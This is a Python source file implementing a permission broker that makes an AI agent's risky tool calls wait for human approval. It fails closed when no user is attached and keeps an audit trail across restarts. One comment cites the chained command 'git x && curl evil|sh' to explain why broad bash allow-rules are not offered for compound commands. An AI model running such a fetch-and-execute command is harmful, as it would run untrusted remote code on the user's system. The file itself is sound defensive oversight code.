"""Process-wide tool-call permission broker (opencode-style approval gate).

Every ``HostDispatcher.__call__`` for a risk-bearing tool consults the singleton
``broker()`` via :meth:`PermissionBroker.gate`. The gate resolves the call
against the persisted rules (see :meth:`Store.resolve_permission`) and:

* ``allow`` → returns immediately;
* ``deny``  → returns a soft-fail the model can recover from;
* ``ask``   → persists a concrete approval request, emits an
  ``await_permission`` event when a UI channel exists, and BLOCKS the daemon
  turn until the user answers, the turn is cancelled, or the request expires.
  Headless/unattended execution fails closed by default; an operator must set
  ``OPENAI4S_UNATTENDED_APPROVAL=allow`` to opt into fail-open behaviour.

The broker is keyed by ``root_frame_id`` so the SAME dispatcher (foreground +
background cells) and any nested/delegated dispatcher all gate uniformly and
their prompts surface in the one conversation the user is watching — without the
delegation subsystem needing to know anything about the gate.
"""
from __future__ import annotations

import hashlib
import os
import re
import threading
import time
import uuid
from typing import Any, Callable

_SCOPES = ("once", "conversation", "project", "global")


def _scope(value: str | None) -> str:
    return value if value in _SCOPES else "once"


def _restart_resolution_marker(store, request: dict, *, allow: bool) -> bool:
    """Append an idempotent, argument-free restart decision to the ledger.

    Permission payloads may be redacted or incomplete and are never replayable
    execution input.  This marker only teaches the next model turn the one fact
    it may rely on: the old action did not execute and must be reconsidered.
    """

    decision_id = str(request.get("decision_id") or "")
    root = str(request.get("root_frame_id") or "")
    tool = re.sub(r"[^A-Za-z0-9_.:-]+", "_", str(request.get("tool") or "unknown"))[
        :120
    ]
    if not decision_id or not root:
        return False
    suffix = hashlib.sha256(decision_id.encode("utf-8")).hexdigest()[:16]
    group_id = f"ag-permission-{suffix}"
    event_id = f"ae-permission-{suffix}"
    if allow:
        content = (
            f"[system] A human approved the previously interrupted {tool} "
            "request after the daemon restarted. The original operation did "
            "not execute. Re-evaluate current state and issue a fresh action "
            "only if it is still needed; never assume the old action succeeded."
        )
        result = {
            "status": "requires_continue",
            "allow": True,
            "requires_continue": True,
            "original_action_executed": False,
            "tool": tool,
        }
    else:
        content = (
            f"[system] A human denied the previously interrupted {tool} "
            "request after the daemon restarted. The original operation did "
            "not execute. Do not assume it succeeded."
        )
        result = {
            "status": "denied",
            "allow": False,
            "requires_continue": False,
            "original_action_executed": False,
            "tool": tool,
        }
    try:
        group = store.get_action_group(group_id)
        if group is None:
            try:
                store.append_action_group(
                    root_frame_id=root,
                    turn_id=f"permission-{suffix}",
                    kind="permission_resolution",
                    group_id=group_id,
                    assistant_content=content,
                    assistant_message={"role": "system", "content": content},
                )
            except Exception:  # noqa: BLE001 - retry an idempotent race below
                if store.get_action_group(group_id) is None:
                    raise
            group = store.get_action_group(group_id)
        events = list((group or {}).get("events") or ())
        if not any(event.get("event_id") == event_id for event in events):
            try:
                store.append_action_event(
                    group_id=group_id,
                    event_id=event_id,
                    type="completed" if allow else "denied",
                    result=result,
                    side_effect_class="runtime_mutation",
                    resource_keys=[f"permission:{tool}"],
                )
            except Exception:  # noqa: BLE001 - accept only a completed race
                group = store.get_action_group(group_id)
                if not any(
                    event.get("event_id") == event_id
                    for event in (group or {}).get("events") or ()
                ):
                    raise
        return True
    except Exception:  # noqa: BLE001 - caller keeps continuation disabled
        return False


def suggest_patterns(method: str, target: str) -> list[str]:
    """Offer a few generalizations of a tool target for the 'remember' picker,
    most-specific first (opencode's biggest UX win over storing exact strings)."""
    target = (target or "").strip()
    out: list[str] = []
    if target:
        out.append(target)
    if method == "bash" and target:
        # A '*' in a bash rule spans shell metacharacters, so a broad prefix rule
        # like 'git *' would also authorize 'git x && curl evil|sh'. Only offer
        # prefix generalizations for a SINGLE simple command (no ; && || | ` $()
        # redirects); for a compound command offer just the exact string.
        if not re.search(r"[;&|`]|\$\(|>|<", target):
            toks = target.split()
            if len(toks) >= 2:
                out.append(f"{toks[0]} {toks[1]} *")
            if toks:
                out.append(f"{toks[0]} *")
    elif method in ("write_file", "edit_file", "read_file", "save_artifact") and target:
        # dir/* and *.ext generalizations
        if "/" in target:
            out.append(target.rsplit("/", 1)[0] + "/*")
        if "." in target.rsplit("/", 1)[-1]:
            out.append("*." + target.rsplit(".", 1)[-1])
    elif method == "web_fetch" and target:
        out.append(target)  # already a domain
    elif (
        method in ("mcp_call", "mcp_resource_read", "mcp_prompt_get") and "/" in target
    ):
        out.append(target.split("/", 1)[0] + "/*")
    out.append("*")
    # de-dupe preserving order
    seen: set[str] = set()
    uniq: list[str] = []
    for p in out:
        if p and p not in seen:
            seen.add(p)
            uniq.append(p)
    return uniq


class _Pending:
    __slots__ = (
        "event",
        "allow",
        "scope",
        "pattern",
        "message",
        "payload",
        "created_at",
        "store",
    )

    def __init__(self, payload: dict, store=None):
        self.event = threading.Event()
        self.allow = False
        self.scope = "once"
        self.pattern: str | None = None
        self.message: str | None = None
        self.payload = payload
        self.created_at = time.time()
        self.store = store


class PermissionBroker:
    DEFAULT_TIMEOUT = (
        900.0  # 15 min — backstop so a never-answered prompt frees the turn
    )
    _POLL = 0.5

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._channels: dict[str, dict] = {}  # root_frame_id -> {emit, cancel}
        self._pending: dict[str, _Pending] = {}  # decision_id -> _Pending
        self._by_root: dict[str, set[str]] = {}  # root_frame_id -> {decision_id}

    # --- UI channel registration (called by the web gateway) --------------
    def register_channel(
        self,
        root_frame_id: str,
        emit: Callable[[dict], Any],
        cancel_event: threading.Event | None = None,
        watching: Callable[[], bool] | None = None,
        store=None,
    ) -> None:
        # `watching` is UI metadata only. Approval correctness never depends on
        # a subscriber being present: unwatched requests remain durably pending.
        with self._lock:
            self._channels[root_frame_id] = {
                "emit": emit,
                "cancel": cancel_event,
                "watching": watching,
                "store": store,
            }

    def unregister_channel(self, root_frame_id: str) -> None:
        with self._lock:
            self._channels.pop(root_frame_id, None)

    def pending_events(self, root_frame_id: str, *, store=None) -> list[dict]:
        """Outstanding await_permission payloads for a conversation (for a
        client reconnecting mid-pause)."""
        with self._lock:
            memory = [
                self._pending[d].payload
                for d in self._by_root.get(root_frame_id, ())
                if d in self._pending
            ]
            channel = self._channels.get(root_frame_id) or {}
            store = store or channel.get("store")
        if store is None:
            return memory
        seen = {item.get("decision_id") for item in memory}
        try:
            durable = [
                row.get("payload") or {}
                for row in store.list_permission_requests(
                    root_frame_id=root_frame_id,
                    state="pending",
                )
                if row.get("decision_id") not in seen
            ]
        except Exception:  # noqa: BLE001 — reconnect must remain available
            durable = []
        return memory + durable

    def is_pending(self, root_frame_id: str) -> bool:
        """Whether a tool call is currently blocked awaiting approval for this
        conversation. The cell watchdog uses this to freeze its clock so a slow
        human approval is not mistaken for a wedged cell."""
        with self._lock:
            return bool(self._by_root.get(root_frame_id))

    # --- the gate (called by HostDispatcher, on the turn thread) ----------
    def gate(
        self,
        *,
        store,
        frame_id: str | None,
        method: str,
        target: str = "",
        view: tuple | None = None,
        project_id: str | None = None,
        action_group_id: str | None = None,
        action_id: str | None = None,
        tool_call_id: str | None = None,
        side_effect_class: str | None = None,
        resource_keys: list[str] | tuple[str, ...] | None = None,
        dangerous: bool = False,
        timeout: float | None = None,
    ) -> dict:
        # Resolve the conversation identity + project from the dispatcher's frame
        # (works for root, background and delegated child dispatchers alike).
        root = frame_id
        proj = project_id
        try:
            if frame_id:
                fr = store.get_frame(frame_id)
                if fr:
                    root = fr.get("root_frame_id") or frame_id
                    proj = proj or fr.get("project_id") or "default"
                # A delegated sub-agent's child frame carries project_id='default';
                # resolve the project from the ROOT conversation frame so project-
                # scoped rules (and the ROOT's UI channel) apply to sub-agents too.
                if root and root != frame_id:
                    rfr = store.get_frame(root)
                    if rfr and rfr.get("project_id"):
                        proj = rfr.get("project_id")
        except Exception:  # noqa: BLE001 — never let resolution break a tool call
            pass
        try:
            decision = store.resolve_permission(
                root_frame_id=root,
                project_id=proj or "default",
                tool=method,
                pattern_input=target,
            )
        except Exception:  # noqa: BLE001
            decision = "ask"
        if decision == "allow":
            return {"allow": True}
        if decision == "deny":
            return {
                "allow": False,
                "message": "blocked by a standing 'deny' permission rule",
            }
        restart_once_grant = None
        try:
            if root:
                restart_once_grant = store.consume_restart_permission_grant(
                    root_frame_id=root,
                    project_id=proj or "default",
                    tool=method,
                    target=target,
                )
        except Exception:  # noqa: BLE001 - an unusable grant never fails open
            restart_once_grant = None
        if restart_once_grant is not None:
            return {
                "allow": True,
                "continuation_decision_id": restart_once_grant.get("decision_id"),
            }

        # decision == "ask": allocate the durable identity before deciding how
        # the caller will wait, so even a headless denial is auditable.
        did = "perm-" + uuid.uuid4().hex[:12]
        kind = view[0] if view else method
        title = view[1] if view else method
        inp = view[2] if (view and len(view) > 2) else {}
        payload = {
            "type": "await_permission",
            "frame_id": root,
            "decision_id": did,
            "tool": method,
            "kind": kind,
            "title": title,
            "input": inp,
            "target": target,
            "suggested_patterns": suggest_patterns(method, target),
            "scopes": list(_SCOPES),
            "sub_agent": bool(frame_id and root and frame_id != root),
            "action_group_id": action_group_id,
            "action_id": action_id,
            "tool_call_id": tool_call_id,
            "side_effect_class": side_effect_class,
            "resource_keys": list(resource_keys or ()),
            # The tool's own risk declaration, so the card can ask for a
            # dangerous capability differently than for a file read. Carried in
            # the payload rather than a new column: the payload is stored with
            # the request, so the durable record and any replay of it keep the
            # fact without a migration.
            "dangerous": bool(dangerous),
        }
        wait_seconds = timeout if timeout is not None else self.DEFAULT_TIMEOUT
        try:
            store.create_permission_request(
                decision_id=did,
                root_frame_id=root,
                frame_id=frame_id,
                project_id=proj or "default",
                action_group_id=action_group_id,
                action_id=action_id,
                tool_call_id=tool_call_id,
                side_effect_class=side_effect_class,
                resource_keys=resource_keys,
                tool=method,
                target=target,
                payload=payload,
                expires_at=int((time.time() + wait_seconds) * 1000),
            )
        except Exception:  # noqa: BLE001 — inability to audit must fail closed
            return {
                "allow": False,
                "message": "approval required but its durable request could not be recorded",
            }

        with self._lock:
            chan = self._channels.get(root)
            if chan is not None and chan.get("store") is None:
                chan["store"] = store
        if chan is None:
            unattended = (
                os.environ.get("OPENAI4S_UNATTENDED_APPROVAL", "deny").strip().lower()
            )
            allowed = unattended == "allow"
            state = "allowed" if allowed else "denied"
            message = (
                "allowed by explicit unattended approval policy"
                if allowed
                else "approval required but no interactive channel is attached"
            )
            try:
                store.resolve_permission_request(
                    did,
                    state=state,
                    scope="once",
                    message=message,
                    resolution_context="unattended",
                )
            except Exception:  # noqa: BLE001
                allowed = False
                message = "approval persistence failed closed"
            return {
                "allow": allowed,
                "decision_id": did,
                **({} if allowed else {"message": message}),
            }

        cancel_ev = chan.get("cancel")
        if cancel_ev is not None and cancel_ev.is_set():
            try:
                store.resolve_permission_request(
                    did,
                    state="cancelled",
                    scope="once",
                    message="turn cancelled",
                    resolution_context="live_thread",
                )
            except Exception:  # noqa: BLE001
                pass
            return {"allow": False, "message": "turn cancelled"}

        pend = _Pending(payload, store=store)
        with self._lock:
            self._pending[did] = pend
            self._by_root.setdefault(root, set()).add(did)
        try:
            chan["emit"](payload)
        except Exception:  # noqa: BLE001
            pass

        deadline = time.time() + wait_seconds
        try:
            while not pend.event.wait(self._POLL):
                if cancel_ev is not None and cancel_ev.is_set():
                    pend.allow, pend.message = False, "turn cancelled"
                    break
                if time.time() >= deadline:
                    pend.allow, pend.message = False, "approval timed out"
                    break
        finally:
            with self._lock:
                self._pending.pop(did, None)
                s = self._by_root.get(root)
                if s:
                    s.discard(did)
                    if not s:
                        self._by_root.pop(root, None)
            try:
                chan["emit"](
                    {
                        "type": "permission_resolved",
                        "frame_id": root,
                        "decision_id": did,
                        "allow": pend.allow,
                        "scope": pend.scope,
                    }
                )
            except Exception:  # noqa: BLE001
                pass

        durable_state = (
            "allowed"
            if pend.allow
            else (
                "cancelled"
                if pend.message == "turn cancelled"
                else ("timed_out" if pend.message == "approval timed out" else "denied")
            )
        )
        try:
            store.resolve_permission_request(
                did,
                state=durable_state,
                scope=pend.scope,
                pattern=pend.pattern,
                message=pend.message,
                resolution_context="live_thread",
            )
        except Exception:  # noqa: BLE001 — the action is already decided in memory
            if pend.allow:
                return {
                    "allow": False,
                    "message": "approval resolution could not be durably recorded",
                }
        # Persist a standing rule only after the concrete request's terminal
        # state is durable; otherwise a failed audit write could still leave a
        # broad allow rule behind.
        if pend.scope and pend.scope != "once":
            scope_id = {
                "conversation": root,
                "project": proj or "default",
                "global": "",
            }.get(pend.scope, "")
            try:
                store.set_permission_rule(
                    scope=pend.scope,
                    scope_id=scope_id,
                    tool=method,
                    pattern=(pend.pattern or target or "*"),
                    decision=("allow" if pend.allow else "deny"),
                )
            except Exception:  # noqa: BLE001
                pass
        if pend.allow:
            return {"allow": True, "decision_id": did}
        return {
            "allow": False,
            "decision_id": did,
            "message": pend.message or "denied by user",
        }

    # --- decision + cancel (called by the web gateway / HTTP thread) ------
    def resolve(
        self,
        decision_id: str | None,
        *,
        allow: bool,
        scope: str = "once",
        pattern: str | None = None,
        message: str | None = None,
    ) -> bool:
        return bool(
            self.resolve_result(
                decision_id,
                allow=allow,
                scope=scope,
                pattern=pattern,
                message=message,
            ).get("ok")
        )

    def resolve_result(
        self,
        decision_id: str | None,
        *,
        allow: bool,
        scope: str = "once",
        pattern: str | None = None,
        message: str | None = None,
        store=None,
        root_frame_id: str | None = None,
    ) -> dict:
        """Resolve an approval and describe whether another turn is required.

        A live decision wakes the exact blocked thread.  After a daemon restart
        that thread no longer exists, so this method never replays stored tool
        arguments.  Instead it records an argument-free ledger marker and
        returns ``requires_continue``; a fresh model turn must replan the work.
        """

        if not decision_id:
            return {"ok": False, "error": "decision_id is required"}
        normalized_scope = _scope(scope)
        with self._lock:
            pend = self._pending.get(decision_id)
            if pend is not None:
                pending_root = str(pend.payload.get("frame_id") or "")
                if root_frame_id and pending_root != root_frame_id:
                    return {"ok": False, "error": "decision does not belong to frame"}
                if pend.event.is_set():
                    return {"ok": False, "error": "decision is already resolving"}
                pend.allow = bool(allow)
                pend.scope = normalized_scope
                pend.pattern = pattern
                pend.message = message
                pend.event.set()
                return {
                    "ok": True,
                    "decision_id": decision_id,
                    "allow": bool(allow),
                    "scope": normalized_scope,
                    "resolution_context": "live_thread",
                    "requires_continue": False,
                    "original_action_executed": None,
                }
            # After a daemon restart there is no blocked thread, but the
            # durable request must still be resolvable and auditable.
            stores = ([store] if store is not None else []) + [
                channel.get("store")
                for channel in self._channels.values()
                if channel.get("store") is not None
            ]
        terminal = "allowed" if allow else "denied"
        seen_stores: set[int] = set()
        for durable_store in stores:
            if durable_store is None or id(durable_store) in seen_stores:
                continue
            seen_stores.add(id(durable_store))
            try:
                request = durable_store.get_permission_request(decision_id)
                if request is None:
                    continue
                request_root = str(request.get("root_frame_id") or "")
                if root_frame_id and request_root != root_frame_id:
                    return {"ok": False, "error": "decision does not belong to frame"}
                state = str(request.get("state") or "")
                if state == "pending":
                    expires_at = request.get("expires_at")
                    if expires_at is not None and int(expires_at) <= int(
                        time.time() * 1000
                    ):
                        # A pending that outlived its backstop (e.g. it was
                        # created before a daemon restart) is no longer a valid
                        # approval; time it out instead of activating a fresh
                        # grant from a stale, possibly forgotten, prompt.
                        try:
                            durable_store.resolve_permission_request(
                                decision_id,
                                state="timed_out",
                                scope="once",
                                message="approval timed out",
                                resolution_context="expired",
                            )
                        except Exception:  # noqa: BLE001 - best-effort cleanup
                            pass
                        return {"ok": False, "error": "approval request expired"}
                    request = durable_store.resolve_permission_request(
                        decision_id,
                        state=terminal,
                        scope=normalized_scope,
                        pattern=pattern,
                        message=message,
                        resolution_context="after_restart",
                        # Activated only after the ledger marker is durable.
                        continuation_required=False,
                    )
                elif not (
                    state == terminal
                    and request.get("resolution_context") == "after_restart"
                ):
                    return {
                        "ok": False,
                        "error": f"decision is already {state or 'resolved'}",
                    }
                if _scope(request.get("scope")) != normalized_scope or (
                    request.get("pattern") or None
                ) != (pattern or None):
                    return {
                        "ok": False,
                        "error": "resolved decision scope or pattern cannot be changed",
                    }

                if not _restart_resolution_marker(
                    durable_store, request, allow=bool(allow)
                ):
                    return {
                        "ok": False,
                        "decision_recorded": True,
                        "error": "approval was recorded but its continuation marker failed",
                        "requires_continue": False,
                        "original_action_executed": False,
                    }

                if allow:
                    request = durable_store.activate_restart_permission_continuation(
                        decision_id,
                        expires_at=(
                            int((time.time() + self.DEFAULT_TIMEOUT) * 1000)
                            if normalized_scope == "once"
                            else None
                        ),
                    )

                if normalized_scope != "once":
                    scope_id = {
                        "conversation": request_root,
                        "project": request.get("project_id") or "default",
                        "global": "",
                    }[normalized_scope]
                    durable_store.set_permission_rule(
                        scope=normalized_scope,
                        scope_id=scope_id,
                        tool=str(request.get("tool") or ""),
                        pattern=(pattern or request.get("target") or "*"),
                        decision=("allow" if allow else "deny"),
                    )
                once_consumed = bool(request.get("continuation_consumed_at"))
                once_expired = bool(
                    allow
                    and normalized_scope == "once"
                    and (
                        not request.get("continuation_expires_at")
                        or int(request["continuation_expires_at"])
                        <= int(time.time() * 1000)
                    )
                )
                requires_continue = bool(
                    allow
                    and (
                        normalized_scope != "once"
                        or (not once_consumed and not once_expired)
                    )
                )
                return {
                    "ok": True,
                    "decision_id": decision_id,
                    "allow": bool(allow),
                    "scope": normalized_scope,
                    "resolution_context": "after_restart",
                    "requires_continue": requires_continue,
                    "original_action_executed": False,
                    "continuation_expires_at": (
                        request.get("continuation_expires_at") if allow else None
                    ),
                    "continuation_authorization": (
                        (
                            "consumed"
                            if once_consumed
                            else ("expired" if once_expired else "once")
                        )
                        if allow and normalized_scope == "once"
                        else "standing_rule"
                    )
                    if allow
                    else None,
                }
            except Exception:  # noqa: BLE001 — try another registered store
                continue
        return {"ok": False, "error": "unknown or expired decision"}

    def cancel_root(self, root_frame_id: str) -> None:
        """Deny every pending prompt for a conversation (on turn cancel)."""
        with self._lock:
            dids = list(self._by_root.get(root_frame_id, ()))
            for did in dids:
                pend = self._pending.get(did)
                if pend is not None:
                    pend.allow = False
                    pend.message = "turn cancelled"
                    pend.event.set()


_BROKER: PermissionBroker | None = None
_BROKER_LOCK = threading.Lock()


def broker() -> PermissionBroker:
    global _BROKER
    if _BROKER is None:
        with _BROKER_LOCK:
            if _BROKER is None:
                _BROKER = PermissionBroker()
    return _BROKER
